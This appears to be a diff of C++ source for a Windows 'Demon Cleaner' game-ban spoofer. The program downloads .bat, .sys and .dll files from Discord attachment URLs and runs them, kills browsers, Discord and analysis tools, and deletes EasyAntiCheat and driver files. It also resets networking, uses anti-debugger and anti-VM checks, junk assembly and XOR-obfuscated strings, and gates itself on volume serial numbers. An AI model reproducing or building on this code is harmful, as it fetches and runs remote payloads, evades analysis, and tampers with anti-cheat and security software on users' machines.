@@ -17,6 +17,23 @@
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib,"Wininet.lib") 
 using namespace junkcode;
+#define JUNK_CODE_ONE        \
+    __asm{push eax}            \
+    __asm{xor eax, eax}        \
+    __asm{setpo al}            \
+    __asm{push edx}            \
+    __asm{xor edx, eax}        \
+    __asm{sal edx, 2}        \
+    __asm{xchg eax, edx}    \
+    __asm{pop edx}            \
+    __asm{or eax, ecx}        \
+    __asm{pop eax}
+
+inline int AddSubOne(int One, int Two)
+{
+    JUNK_CODE_ONE
+        return ((One + Two) - 1);
+}
 void SizeOfImage()
 {
     // Any unreasonably large value will work say for example 0x100000 or 100,000h
@@ -41,94 +58,14 @@ void SizeOfImage()
     __asm{or eax, ecx}        \
     __asm{pop eax}
 
-inline void PushPopSS()
-{
-
-    __asm
-    {
-        push ss
-        pop ss
-        mov eax, 0xC000C1EE
-        xor edx, edx
-    }
-
-}
-PVOID GetPEB()
-{
-#ifdef _WIN64
-    return (PVOID)__readgsqword(0x0C * sizeof(PVOID));
-#else
-    return (PVOID)__readfsdword(0x0C * sizeof(PVOID));
-#endif
-}
-inline bool Int2DCheck()
-{
-    __try
-    {
-        __asm
-        {
-            int 0x2d
-            xor eax, eax
-            add eax, 2
-        }
-    }
-    __except (EXCEPTION_EXECUTE_HANDLER)
-    {
-        return false;
-    }
-
-    return true;
-}
-bool MemoryBreakpointDebuggerCheck()
-{
-    unsigned char* pMem = NULL;
-    SYSTEM_INFO sysinfo = { 0 };
-    DWORD OldProtect = 0;
-    void* pAllocation = NULL;
-
-    GetSystemInfo(&sysinfo);
-
-    pAllocation = VirtualAlloc(NULL, sysinfo.dwPageSize,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE);
-
-    if (pAllocation == NULL)
-        return false;
-
-    pMem = (unsigned char*)pAllocation;
-    *pMem = 0xc3;
 
 
-    if (VirtualProtect(pAllocation, sysinfo.dwPageSize,
-        PAGE_EXECUTE_READWRITE | PAGE_GUARD,
-        &OldProtect) == 0)
-    {
-        return false;
-    }
 
-    __try
-    {
-        __asm
-        {
-            mov eax, pAllocation
-            push MemBpBeingDebugged
-            jmp eax
-        }
-    }
-    __except (EXCEPTION_EXECUTE_HANDLER)
-    {
-        VirtualFree(pAllocation, NULL, MEM_RELEASE);
-        return false;
-    }
 
-    __asm {MemBpBeingDebugged:}
-    VirtualFree(pAllocation, NULL, MEM_RELEASE);
-    return true;
-}
 void apex()
 {
 
-    akfuxnl();
+
     std::string apex = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114575800954941/apex.bat"));
     std::string apexpath = "C:\\Windows\\Vss\\Apex.bat";
     URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
@@ -140,18 +77,18 @@ void apex()
 void gta()
 {
 
-    akfuxnl();
+
     std::string gta = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114574483918858/gta.bat"));
-    std::string gtapath = "C:\\Windows\Vss\\gta.bat";
+    std::string gtapath = "C:\\Windows\\Vss\\gta.bat";
     URLDownloadToFileA(NULL, gta.c_str(), gtapath.c_str(), 0, NULL);
     system("cd C:\\Windows\\Vss\\");
     system("Start C:\\Windows\\Vss\\gta.bat");
-
+    apex();
 }
 void fortnite()
 {
 
-    akfuxnl();
+
     std::string fortnite = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114573007527946/Fortnite.bat"));
     std::string fortnitepath = "C:\\Windows\\Vss\\Fortnite.bat";
     URLDownloadToFileA(NULL, fortnite.c_str(), fortnitepath.c_str(), 0, NULL);
@@ -160,19 +97,16 @@ void fortnite()
 }
 void fishingplanet()
 {
-
-    akfuxnl();
     std::string fishingplanet = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114571648593931/fishing-planet.bat"));
     std::string fishingplanetpath = "C:\\Windows\\Vss\\Fishing-planet.bat";
     URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
     system("cd C:\\Windows\Vss\\");
     system("Start C:\\Windows\\Vss\\Fishing-planet.bat");
-
+    gta();
 }
 void cod()
 {
 
-    akfuxnl();
     std::string cod = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114570369318962/Cold-Ware.bat"));
     std::string codpath = "C:\\Windows\\Vss\\Cold-Ware.bat";
     URLDownloadToFileA(NULL, cod.c_str(), codpath.c_str(), 0, NULL);
@@ -182,42 +116,13 @@ void cod()
 
 }
 
-void demondll()
-{
-    akfuxnl();
-    std::string dll = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/881164876037361684/Demon_DLL.dll"));
-    std::string dllpath = "C:\\Windows\\Vss\\demon.dll";
-    URLDownloadToFileA(NULL, dll.c_str(), dllpath.c_str(), 0, NULL);
 
-
-}
 void cleaner() {
-    int loc_406FE0 = 2;
-    if (loc_406FE0 = 2)
-    {
 
-    }
-    else
-    {
-
-    }
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    //re use
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    system(XorStr("cls").c_str());
     system(XorStr("taskkill /F /IM CCleaner64.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM WargamingErrorMonitor.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM wargamingerrormonitor.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM WorldOfTanks.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM clRender.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM chrome.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM msedge.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM discord.exe 2>NULL").c_str());
@@ -229,7 +134,6 @@ void cleaner() {
     system(XorStr("taskkill /F /IM vmware-authd.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM vmnat.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM Spotify.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM MSBuild.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM wcg.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM UnrealCEFSubProcess.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM CEFProcess.exe 2>NULL").c_str());
@@ -242,18 +146,14 @@ void cleaner() {
     system(XorStr("taskkill /F /IM FortniteClient-Win64-Shipping_BE.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM FortniteLauncher.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM r5apex.exe 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Windows\Capcom.sys 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Windows\\Capcom.sys 2>NULL").c_str());
     system(XorStr("del /F /IM del /f %temp%\* 2>NULL").c_str());
-    system(XorStr("del /F /IM D:\steam\depotcache\* 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Program Files (x86)\EasyAntiCheat\EasyAntiCheat.exe 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Program Files (x86)\EasyAntiCheat\EasyAntiCheat.sys 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Windows\KsDumperDriver.sys 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Windows\System32\Capcom.sys 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Windows\System32\KsDumperDriver.sys 2>NULL").c_str());
-    system(XorStr("sc stop capcom").c_str());
-    system(XorStr("sc delete capcom").c_str());
-    system(XorStr("taskkill /F /IM cef_subprocces.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM devenv.exe 2>NULL").c_str());
+    system(XorStr("del /F /IM D:\\steam\\depotcache\\* 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Program Files (x86)\\EasyAntiCheat\\EasyAntiCheat.exe 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Program Files (x86)\\EasyAntiCheat\\EasyAntiCheat.sys 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Windows\\KsDumperDriver.sys 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Windows\\System32\\Capcom.sys 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Windows\\System32\KsDumperDriver.sys 2>NULL").c_str());
     system(XorStr("taskkill /F /IM openvpnserv.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM LockApp.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM vmware.exe 2>NULL").c_str());
@@ -322,16 +222,12 @@ void cleaner() {
     system(XorStr("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
     system(XorStr("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
     system(XorStr("sc delete HTTPDebuggerPro >nul 2>&1").c_str());
-    system(XorStr("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1").c_str());
     system(XorStr("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1").c_str());
-    system(XorStr("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1").c_str());
-
+    fishingplanet();
 }
 void deleter()
 {
-    MemoryBreakpointDebuggerCheck();
-    GetPEB();
-    PushPopSS();
+
 
     //delete the files we downloaded
     system("cd C:\\Windows\Vss\\");
@@ -345,45 +241,9 @@ void deleter()
 
     
 }
-void internet()
-{
-    MemoryBreakpointDebuggerCheck();
-    GetPEB();
-    PushPopSS();
 
-    //internet cache deleter / reseter
-
-    system(XorStr("NETSH WINSOCK RESET").c_str());
-    system(XorStr("NETSH INT IP RESET").c_str());
-    system(XorStr("NETSH INTERFACE IPV4 RESET").c_str());
-    system(XorStr("NETSH INTERFACE IPV6 RESET").c_str());
-    system(XorStr("NETSH INTERFACE TCP RESET").c_str());
-    system(XorStr("IPCONFIG /RELEASE").c_str());
-    system(XorStr("IPCONFIG /RELEASE").c_str());
-    system(XorStr("IPCONFIG /RENEW").c_str());
-    system(XorStr("IPCONFIG /FLUSHDNS").c_str());
-    system(XorStr("IPCONFIG /RENEW").c_str());
-}
 void safeshutdown()
 {
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-
-
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-
-    MemoryBreakpointDebuggerCheck();
-    GetPEB();
-    PushPopSS();
-
-
 
     system(XorStr("cls").c_str());
     rydekem();
@@ -432,10 +292,6 @@ void safeshutdown()
 }
 void driverdetect()
 {
-    MemoryBreakpointDebuggerCheck();
-    GetPEB();
-    PushPopSS();
-    driverdetect();
     const TCHAR* devices[] = {
 _T("\\\\.\\Dumper"),
 _T("\\\\.\\KsDumper")
@@ -465,12 +321,8 @@ void spoofer()
     akfuxnl();
     lnttirs();
 
-    MemoryBreakpointDebuggerCheck();
-    GetPEB();
-    PushPopSS();
-    driverdetect();
 
-    akfuxnl();
+
     string spoofer = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/881227464498630677/NewWoof.sys"));
     string spooferpath = "C:\\Windows\\Vss\\woof.sys"; 
     URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);
@@ -485,18 +337,25 @@ void spoofer()
     Sleep(2000);
     rydekem();
     plvbjwh();
-    tlmisir();
+
     akfuxnl();
     lnttirs();
+    system(XorStr("NETSH WINSOCK RESET").c_str());
+    system(XorStr("NETSH INT IP RESET").c_str());
+    system(XorStr("NETSH INTERFACE IPV4 RESET").c_str());
+    system(XorStr("NETSH INTERFACE IPV6 RESET").c_str());
+    system(XorStr("NETSH INTERFACE TCP RESET").c_str());
+    system(XorStr("IPCONFIG /RELEASE").c_str());
+    system(XorStr("IPCONFIG /RELEASE").c_str());
+    system(XorStr("IPCONFIG /RENEW").c_str());
+    system(XorStr("IPCONFIG /FLUSHDNS").c_str());
+    system(XorStr("IPCONFIG /RENEW").c_str());
+    system(XorStr("cls").c_str());
     safeshutdown();
 }
 
 void setcolor(unsigned short color)
 {
-    MemoryBreakpointDebuggerCheck();
-    GetPEB();
-    PushPopSS();
-    driverdetect();
 
     HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
     SetConsoleTextAttribute(hcon, color);
@@ -511,71 +370,44 @@ string replaceAll(string subject, const string& search,
     return subject;
 }
 
-string DownloadString(string URL) {
-    HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
-    HINTERNET urlFile;
-    string rtn;
-    if (interwebs) {
-        urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
-        if (urlFile) {
-            char buffer[2000];
-            DWORD bytesRead;
-            do {
-                InternetReadFile(urlFile, buffer, 2000, &bytesRead);
-                rtn.append(buffer, bytesRead);
-                memset(buffer, 0, 2000);
-            } while (bytesRead);
-            InternetCloseHandle(interwebs);
-            InternetCloseHandle(urlFile);
-            string p = replaceAll(rtn, "|n", "\r\n");
-            return p;
-        }
-    }
-    InternetCloseHandle(interwebs);
-    string p = replaceAll(rtn, "|n", "\r\n");
-    return p;
-}
+
 
 vector<string> serial;
 
 void loadserial()
 {
-    MemoryBreakpointDebuggerCheck();
-    GetPEB();
-    PushPopSS();
-    driverdetect();
-    driverdetect();
+    
+
     serial.push_back(XorStr("384604182").c_str());
     serial.push_back(XorStr("2953439145").c_str());
 }
 
 void mainbot()
 {
-    MemoryBreakpointDebuggerCheck();
-    GetPEB();
-    PushPopSS();
-    driverdetect();
+    
+
     TCHAR volumeName[MAX_PATH + 1] = { 0 };
     TCHAR fileSystemName[MAX_PATH + 1] = { 0 };
     DWORD serialNumber = 0;
     DWORD maxComponentLen = 0;
     DWORD fileSystemFlags = 0;
 
-    driverdetect();
     
-
+    JUNK_CODE_ONE
     if (GetVolumeInformation(_T("C:\\"), volumeName, ARRAYSIZE(volumeName), &serialNumber, &maxComponentLen, &fileSystemFlags, fileSystemName, ARRAYSIZE(fileSystemName)));
     while (true)
     {
+        JUNK_CODE_ONE
         if (find(serial.begin(), serial.end(), to_string(serialNumber)) != serial.end())
         {
+            JUNK_CODE_ONE
             SetConsoleTitle(_T("Demon Cleaner V1.0 [release build]"));
             setcolor(12);
             std::cout << " _| |___ _____ ___ ___ \n";
             std::cout << "| . | -_|     | . |   |\n";
             std::cout << "|___|___|_|_|_|___|_|_|\n";
 
-
+            JUNK_CODE_ONE
             std::cout << "\n";
 
             system(XorStr("start http://demoncleaner.gq").c_str());
@@ -588,12 +420,8 @@ void mainbot()
             std::cout << GREEN << "\nloading in memory...";
             Sleep(2400);
             system(XorStr("cls").c_str());
-            internet();
-            demondll();
             cleaner();
-            fishingplanet();
-            gta();
-            apex();
+
             cod();
             fortnite();
             spoofer();
@@ -621,14 +449,7 @@ typedef NTSTATUS(NTAPI* pfnNtSetInformationThread)(
     _In_ ULONG  ThreadInformationLength
     );
 const ULONG ThreadHideFromDebugger = 0x11;
-void HideFromDebugger()
-{
-    HMODULE hNtDll = LoadLibrary(TEXT("ntdll.dll"));
-    pfnNtSetInformationThread NtSetInformationThread = (pfnNtSetInformationThread)
-        GetProcAddress(hNtDll, "NtSetInformationThread");
-    NTSTATUS status = NtSetInformationThread(GetCurrentThread(),
-        ThreadHideFromDebugger, NULL, 0);
-}
+
 string build_date()
 {
     return __DATE__;
@@ -638,24 +459,8 @@ string build_time()
 {
     return __TIME__;
 }
-int main()
+void otherthing()
 {
-
-    LPCWSTR windowName = L"x32dbg"; 
-    LPCWSTR vmname = L"VMware Workstation";
-    if (FindWindow(NULL, windowName))
-    {
-        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
-        exit(0);
-
-    }
-    if (FindWindow(NULL, vmname))
-    {
-        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO VMware Workstation Detected. && TIMEOUT 10 >nul").c_str());
-        exit(0);
-
-    }
-    
     DWORD OldProtect = 0;
 
     // Get base address of module
@@ -675,12 +480,31 @@ int main()
         mov eax, [eax + 0x0c]			// InOrderModuleList
         mov dword ptr[eax + 20h], 20000h // SizeOfImage    
     }
+}
+int main()
+{
+
+    LPCWSTR windowName = L"x32dbg"; 
+    LPCWSTR vmname = L"VMware Workstation";
+    if (FindWindow(NULL, windowName))
+    {
+        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
+        exit(0);
+
+    }
+    if (FindWindow(NULL, vmname))
+    {
+        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO VMware Workstation Detected. && TIMEOUT 10 >nul").c_str());
+        exit(0);
+
+    }
     if (IsDebuggerPresent())
     {
         system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO Debugger Detected. && TIMEOUT 10 >nul").c_str());
         exit(0);
     }
     
+
     else
     {
         if (GetLastError)
@@ -688,17 +512,20 @@ int main()
             system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Banned && ECHO You have been banned for using reverse engineering tools against our software. && TIMEOUT 10 >nul").c_str());
             exit(0);
         }
-        HideFromDebugger();
-        Int2DCheck();
-        MemoryBreakpointDebuggerCheck();
-        build_date();
-        build_time();
-        GetPEB();
-        PushPopSS();
-        driverdetect();
-        loadserial();
-        mainbot();
+        else
+        {
+            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+            driverdetect();
+            build_date();
+            build_time();
+            loadserial();
+            mainbot();
+        }
+        
     }
-    
+ 
 }
 
